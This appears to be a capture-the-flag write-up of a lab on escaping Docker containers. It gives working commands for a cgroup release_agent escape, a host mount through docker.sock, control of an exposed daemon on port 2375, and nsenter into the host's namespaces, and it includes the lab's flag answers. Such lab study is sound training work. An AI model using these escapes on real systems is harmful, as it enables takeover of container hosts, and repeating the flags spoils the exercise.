# Task 1 : Introduction 
This room will demonstrate some of the common vulnerabilities found in Docker containers and how an attacker can abuse these to escape.

## Learning Objectives

In this room, you will learn the following:

- Some of the vulnerabilities that can exist in a Docker container.
- What you, as an attacker, can gain from exploiting these vulnerabilities.
- Why these vulnerabilities exist (i.e. misconfiguration).
- How to search for vulnerabilities within a Docker container.

### Prerequisites

Before proceeding, it is strongly recommended that you have completed the Intro to Docker room and are comfortable with the Linux CLI.

### Important Context

This room focuses on exploiting the Docker daemon itself, which often, relies on having elevated permissions within the container. In other words, this room assumes that you have already managed to become root in the container.

# Task 2 : Container Vulnerabilities 101

## Important Notes about Docker Containers

### Limited Access within Containers
- Just because you have access (i.e., a foothold) to a container, it does not mean you have access to:
  - The **host operating system** and associated files.
  - Other containers running on the same host.

- Due to the minimal nature of containers (i.e., they only have the tools specified by the developer):
  - Fundamental tools like **Netcat**, **Wget**, or even **Bash** may not be present.
  - This makes interacting within a container more difficult for an attacker.

---

### What Sort of Vulnerabilities Can We Expect in Docker Containers?
While Docker containers are designed to **isolate applications** from one another, they can still be vulnerable. Examples include:

1. **Hard-Coded Passwords**:
   - Developers may leave hard-coded credentials within the application or container image.
   - If an attacker gains access (e.g., via a vulnerable web application), they can exploit these credentials.

2. **Misconfigured Containers**:
   - Containers with excessive privileges or improper configurations may expose the system to risks.

3. **Outdated Software**:
   - Vulnerabilities in outdated applications or libraries within the container can be exploited.

4. **Leaky Secrets**:
   - API keys, tokens, or sensitive configuration files may be accessible to an attacker if not properly secured.

---

### Mitigation Strategies
- Avoid using hard-coded passwords or secrets; use secure vaults for managing sensitive information.
- Regularly update container images to include the latest security patches.
- Follow the principle of least privilege when configuring containers.
- Use tools like **Docker Bench** or other container security scanners to identify vulnerabilities.

```dockerfile

/** Database hostname */
define( 'DB_HOST', 'localhost' );

/** Database name */
define( 'DB_NAME', 'sales' );

/** Database username */
define( 'DB_USER', 'production' );

/** Database password */
define( 'DB_PASSWORD', 'SuperstrongPassword321!' );

```

## Additional Vulnerabilities in Containers

Containers are not immune to vulnerabilities. Below are some potential attack vectors and their descriptions:

| **Vulnerability**         | **Description**                                                                                                                                                            |
|---------------------------|---------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| **Misconfigured Containers** | Containers with unnecessary privileges can compromise the host. For instance, a container running in **privileged mode** removes isolation layers, granting access to the host OS. |
| **Vulnerable Images**        | Popular Docker images have been backdoored to perform malicious actions, such as **cryptocurrency mining** or exposing sensitive data.                                     |
| **Network Connectivity**     | Improperly networked containers can be exposed to the internet. For example:                                                                                           |
|                             | - A **database container** for a web application should only be accessible to the web application container, not the internet.                                          |
|                             | - Containers may facilitate **lateral movement**, allowing attackers to interact with other containers on the host once they compromise one.                              |

---

### Summary
These are just some of the vulnerabilities that can exist within containers. The tasks in this room will explore these vulnerabilities in greater detail!


# Task 3 : Vulnerability 1 : Privileged Containers (Capabilities)

At its core, **Linux capabilities** are root permissions assigned to processes or executables within the Linux kernel. These privileges enable a granular assignment of permissions, rather than granting all privileges to a process.

### Capabilities and Docker Modes

Docker containers can operate in two modes:

- **User (Normal) Mode**: Containers in this mode interact with the operating system through the Docker Engine.
- **Privileged Mode**: Containers in this mode bypass the Docker Engine and directly communicate with the host operating system.

In "privileged" mode, a container effectively has root access to the host operating system.

---

### Checking Capabilities

To determine what permissions a container has, you can use tools like `capsh` (from the `libcap2-bin` package) to list the capabilities available to the container:

```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap
```

### Exploiting Privileged Containers:

1. **Create a cgroup and mount it to the container**:
```bash
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
```

2. **Set up a trigger for the kernel**
```bash
echo 1 > /tmp/cgrp/x/notify_on_release
```

3. **Determine the host path**:
```bash
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
```

4. **Define the release agent**:
```bash
echo "$host_path/exploit" > /tmp/cgrp/release_agent
```

5. **Prepare the exploit**: 
```bash
echo '#!/bin/sh' > /exploit
echo "cat /home/cmnatic/flag.txt > $host_path/flag.txt" >> /exploit
chmod a+x /exploit
```

6. **Trigger the exploit**:
```bash
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

### Explaining the Vulnerability

1. **Group Creation:** A cgroup is created and mounted to /tmp/cgrp in the container. This gives root-level control over the cgroup.
    
2. **Notify Kernel:** Setting notify_on_release ensures that the kernel executes something when the cgroup is released.
    
3. **Host Path Discovery:** The container's files are located on the host and stored in a variable for later use.
    
4. **Release Agent Configuration:** The release agent is configured to execute our exploit script.
    
5. **Craft the Exploit:** The exploit is written into the /exploit file. This could be a reverse shell or other payload.
    
6. **Payload Execution:** The kernel executes the exploit when the cgroup process is released.

### Perform the exploit in this task on the target machine. What is the value of the flag that has now been added to the container?
THM{MOUNT_MADNESS}

# Task 4 : Vulnerability 2 : Escaping via Exposed Docker Deamon

## Unix Sockets 101 (One Size Fits All)

When mentioning "sockets," you might immediately think of networking. However, the concept here is similar. **Sockets** are used to move data between two places. **Unix sockets** transfer data via the filesystem rather than networking interfaces. This mechanism, known as **Inter-Process Communication (IPC)**, is crucial for operating systems because it enables data transfer between processes.

Unix sockets are significantly faster at transferring data compared to TCP/IP sockets (Percona, 2020). This is why database technologies like Redis achieve outstanding performance. Additionally, Unix sockets leverage **file system permissions**, which becomes important as we discuss Docker.

---

## How Does Docker Use Sockets?

When interacting with the Docker Engine (e.g., running commands like `docker run`), it is done using a socket. Typically, this is a **Unix socket** unless you're communicating with a remote Docker host. Since Unix sockets rely on file system permissions, users must be members of the **Docker group** (or root) to execute Docker commands.

---

## Finding the Docker Socket in a Container

Containers interact with the host operating system using the Docker Engine, which involves access to the **Docker socket**. This socket, named `docker.sock`, is mounted inside the container. Its location can vary based on the host's operating system. 

For instance, in a container running **Ubuntu 18.04**, the Docker socket is typically located at:

## Exploiting the Docker Socket in a Container

### Goal:
We will exploit the Docker socket to create a new container, mount the host's filesystem, and gain access to it from within the new container.

---

### Step-by-Step Breakdown:

1. **Ensure Access to Docker Commands**
   - You must either have **root privileges** or belong to the "docker" group in the container to execute Docker commands.

2. **Command to Exploit:**
   ```bash
   docker run -v /:/mnt --rm -it alpine chroot /mnt sh
    ```

## Command Explained:

1. **Uploading a Docker Image**:
    - In this scenario, the alpine image is provided on the VM. It’s a lightweight Linux distribution and blends in well for stealth.
    - If the alpine image is not available, you may need to upload it manually.
2. **Starting the Container**:
    -Use docker run to create and start a new container, mounting the host’s filesystem (/) to /mnt in the container:
    ```bash
        docker run -v /:/mnt
    ```
3. **Interactive Shell**:
    - Add the -it flag to run the container interactively, enabling command execution inside it.
4. **Using the alpine Image**:
    - Specify the alpine image as the base for the container.
5. **Changing Root Directory**:
    - Use `chroot` to change the root directory of the conatiner to /mtn:
    ``bash
    chroot /mnt
    ``
6. **Lunching a shell:**
    - Run `sh` to start a shell inside the container.

### Name the directory path which contains the docker.sock file on the container.
/var/run

### Name the directory path which contains the docker.sock file on the container.
THM{NEVER-ENOUGH-SOCKS}

# Task  5 : Vulnerability 3: Remote Code Execution via Exposed Docker Daemon

## The Docker Engine - TCP Sockets Edition

Recall how Docker uses sockets to communicate between the host operating system and containers in the previous task. Docker can also use TCP sockets to achieve this. 

Docker can be remotely administrated. For example, using management tools such as Portainer or Jenkins to deploy containers to test their code (yay, automation!).

## The Vulnerability

The Docker Engine will listen on a port when configured to be run remotely. The Docker Engine is easy to make remotely accessible but difficult to do securely. The vulnerability here is Docker is remotely accessible and allows anyone to execute commands. First, we will need to enumerate.

## Enumerating: Finding Out if a Device Has Docker Remotely Accessible

By default, the engine will run on port 2375. We can confirm this by performing an Nmap scan against your target (10.10.71.237) from your AttackBox.

```bash
nmap -sV -p 2375 10.10.71.237

Starting Nmap 7.60 ( https://nmap.org ) at 2024-11-19 16:54 GMT
Nmap scan report for ip-10-10-71-237.eu-west-1.compute.internal (10.10.71.237)
Host is up (0.00016s latency).

PORT     STATE SERVICE VERSION
2375/tcp open  docker  Docker 20.10.20
MAC Address: 02:70:47:FD:07:CF (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 82.57 seconds

```

Looks like it's open; we're going to use the curl command to start interacting with the exposed Docker daemon. Confirming that we can access the Docker daemon: curl `http://10.10.71.237:2375/version`

```bash
curl http://10.10.71.237:2375/version
{"Platform":{"Name":"Docker Engine - Community"},"Components":[{"Name":"Engine","Version":"20.10.20","Details":{"ApiVersion":"1.41","Arch":"amd64","BuildTime":"2022-10-18T18:18:12.000000000+00:00","Experimental":"false","GitCommit":"03df974","GoVersion":"go1.18.7","KernelVersion":"5.15.0-1022-aws","MinAPIVersion":"1.12","Os":"linux"}},{"Name":"containerd","Version":"1.6.8","Details":{"GitCommit":"9cd3357b7fd7218e4aec3eae239db1f68a5a6ec6"}},{"Name":"runc","Version":"1.1.4","Details":{"GitCommit":"v1.1.4-0-g5fd4c4d"}},{"Name":"docker-init","Version":"0.19.0","Details":{"GitCommit":"de40ad0"}}],"Version":"20.10.20","ApiVersion":"1.41","MinAPIVersion":"1.12","GitCommit":"03df974","GoVersion":"go1.18.7","Os":"linux","Arch":"amd64","KernelVersion":"5.15.0-1022-aws","BuildTime":"2022-10-18T18:18:12.000000000+00:00"}
```

## Executing Docker Commands on Our Target

For this, we'll need to tell our version of Docker to send the command to our target (not our own machine). We can add the "-H" switch to our target. To test if we can run commands, we'll list the containers on the target: `docker -H tcp://10.10.71.237:2375 ps`

```bash
docker -H tcp://10.10.71.237:2375 ps
CONTAINER ID        IMAGE               COMMAND               CREATED             STATUS              PORTS                               NAMES
2225bfdee7ec        dockertest          "/usr/sbin/sshd -D"   10 months ago       Up 56 minutes       0.0.0.0:22->22/tcp, :::22->22/tcp   serene_tharp

```

## What Now

Now that we've confirmed that we can execute docker commands on our target, we can do all sorts of things. For example, start containers, stop containers, delete them, or export the contents of the containers for us to analyse further. It is worth recalling the commands covered in Intro to Docker. However, I've included some commands that you may wish to explore:

| **Command**  | **Description**                                                                                                     |
|--------------|---------------------------------------------------------------------------------------------------------------------|
| `network ls` | Used to list the networks of containers. This can help discover other applications running and pivot to them.       |
| `images`     | List images used by containers; data can also be exfiltrated by reverse-engineering the image.                      |
| `exec`       | Execute a command on a container.                                                                                  |
| `run`        | Run a container.                                                                                                   |


### What port number, by default, does the Docker Engine use?
2375

# Task 6 : Vulnerability 4 : Abusing Namespaces

# Understanding Linux Namespaces and Their Exploitation

## What Are Namespaces?
Namespaces in Linux allow the segregation of system resources like processes, files, and memory into isolated environments. This feature is fundamental to containerization, enabling processes within a namespace to only interact with resources within the same namespace. 

### Key Characteristics
- **Namespace and PID**: Every process has a namespace and a Process Identifier (PID). 
- **Isolation**: Processes in one namespace are isolated from others, ensuring security and resource management.
- **Containerization**: Containers use namespaces to create isolated environments. For example, Docker creates a new namespace for each container.

### Example: Process Isolation in Containers
- On a **host system**, hundreds of processes (e.g., GUI applications, background services) are typically running.
- Inside a **Docker container**, only a minimal set of processes is active, as containers are designed for specific tasks (e.g., running a web server). 

#### Host System Example:
- A typical Ubuntu host might have over 300 processes running (`ps aux` command output).

#### Docker Container Example:
- A Docker container might have only a few processes, often starting with PID 1 (usually `/sbin/init`).

---

## Exploiting Namespace Vulnerabilities

### Abusing Namespace Sharing
In some cases, containers may share the same namespace as the host OS, allowing the container to interact with host processes. This situation arises when:
- Debugging tools are required.
- Containers are configured to access host resources directly.

### Example: Identifying Namespace Sharing
- Using `ps aux` in a container can reveal host processes.
- If the container sees host processes, it indicates potential namespace sharing and a vulnerability to exploit.

---

## Exploit: Escaping Containers Using `nsenter`

### Overview
The `nsenter` command allows executing processes within the namespace of another process. By targeting a critical process like `/sbin/init` (PID 1), it’s possible to gain privileged access to the host system.

### Steps to Exploit
1. **Target the Host Process**:
   - Use `--target 1` to target the `init` process (PID 1), which is the parent of all processes.
2. **Enter Specific Namespaces**:
   - `--mount`: Access the mount namespace of the target process.
   - `--uts`: Share the UTS (hostname) namespace.
   - `--ipc`: Enter the Inter-Process Communication namespace for shared memory.
   - `--net`: Access the network namespace for interacting with host network features.
3. **Execute a Shell**:
   - Launch a shell (e.g., `/bin/bash`) within the host's namespace using the privileges of the `init` process.

#### Example Exploit Command
```bash
nsenter --target 1 --mount --uts --ipc --net /bin/bash
```

### Perform the exploit in this task on the target machine. What is the flag located in /home/tryhackme/flag.txt?
THM{YOUR-SPACE-MY-SPACE}